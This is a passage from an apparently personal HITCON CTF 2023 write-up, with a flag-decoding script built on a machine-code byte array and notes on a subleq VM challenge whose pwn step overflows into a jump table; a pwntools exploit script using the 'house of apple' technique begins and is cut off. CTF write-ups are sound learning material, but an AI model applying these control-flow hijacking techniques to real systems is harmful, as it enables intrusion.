class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xC3</span>]</span><br><span class="line"></span><br><span class="line">res=<span class="hljs-built_in">bytearray</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> offset <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x1337</span>):</span><br><span class="line">    res[offset%<span class="hljs-number">37</span>]^=(offset^data[offset%<span class="hljs-number">0x584</span>])&amp;<span class="hljs-number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">print</span>(res)</span><br></pre></td></tr></tbody></table></figure><h2 id="lessequalmore-amp-SUBformore"><a href="#lessequalmore-amp-SUBformore" class="headerlink" title="lessequalmore &amp; SUBformore"></a>lessequalmore &amp; SUBformore</h2><p>I spend a lot of time on this chall, it’s a subleq vm with plenty of instructions. What I learn from this is that sometimes you don’t need to understand everything to solve a chall.</p><p>It divide input into 8 blocks as an 8*8 matrix do some linear calculations. the easy way to do this is hook the check and change the input byte by byte, monitor the value to get the coefs.</p><p>The pwn part took me a long time since implementing <code>div 8</code> operation in a VM is hard.</p><p>Our input are read and put at the start of the memory section. We can overflow the program and write into the jump table, thereby hijack the controll flow of the program.</p><p>My solution is the same as the author’s intend solution so i recommend the author’s writeup</p><p><a href="https://bronson113.github.io/2023/09/10/hitcon-ctf-2023-lessequalmore-subformore.html#leaking-addresses-and-rce">HITCON CTF 2023 - LessEQualmore / SUBformore</a></p><p>However, my teammate comes with a much easier solution — house of apple. I focused too much on jumping to the stack address, but house of apple works only with known mem address and libc address. So here’s the solve script:</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># %%</span></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="hljs-string">"./lessequalmore_patched"</span>)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line">context.os = <span class="hljs-string">'linux'</span></span><br><span class="line">context.arch = context.binary.arch</span><br><span class="line"><span class="hljs-comment"># context.terminal = ['alacritty', '-e']</span></span><br><span class="line">context.terminal = [<span class="hljs-string">'wt.exe'</span>, <span class="hljs-string">'wsl'</span>, <span class="hljs-string">'--'</span>]</span><br><span class="line"></span><br><span class="line">local = <span class="hljs-literal">False</span></span><br><span class="line"><span class="hljs-keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="hljs-string">'debug'</span></span><br><span class="line">    p = process([exe.path,<span class="hljs-string">"chal.txt"</span>])</span><br><span class="line"><span class="hljs-keyword">else</span>:</span><br><span class="line">    p = remote(<span class="hljs-string">"chal-lessequalmore.chal.hitconctf.com"</span>, <span class="hljs-number">11111</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbgaddr</span>(<span class="hljs-params">addr, PIE=<span class="hljs-literal">False</span></span>):</span>  <span class="hljs-comment"># PIE enabled</span></span><br><span class="line">    <span class="hljs-keyword">if</span> local:</span><br><span class="line">        <span class="hljs-keyword">if</span> PIE:</span><br><span class="line">            text_base = <span class="hljs-built_in">int</span>(</span><br><span class="line">                os.popen(<span class="hljs-string">"pmap {}| awk '{{print $1}}'"</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)</span><br><span class="line">            log.info(<span class="hljs-string">f'b *<span class="hljs-subst">{<span class="hljs-built_in">hex</span>(text_base + addr)}</span>\n'</span>)</span><br><span class="line">            gdb.attach(p, <span class="hljs-string">f'b *<span class="hljs-subst">{<span class="hljs-built_in">hex</span>(text_base + addr)}</span>'</span>)</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            gdb.attach(p, <span class="hljs-string">f'b *<span class="hljs-subst">{<span class="hljs-built_in">hex</span>(addr)}</span>'</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span>(<span class="hljs-params">func=<span class="hljs-string">''</span></span>):</span></span><br><span class="line">    <span class="hljs-keyword">if</span> local:</span><br><span class="line">        gdb.attach(p, func)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main_arena</span>():</span></span><br><span class="line">    <span class="hljs-comment"># from ptrlib</span></span><br><span class="line">    ofs_stdin = libc.sym._IO_2_1_stdin_</span><br><span class="line">    ofs_realloc_hook = libc.sym.__realloc_hook</span><br><span class="line">    ofs_malloc_hook 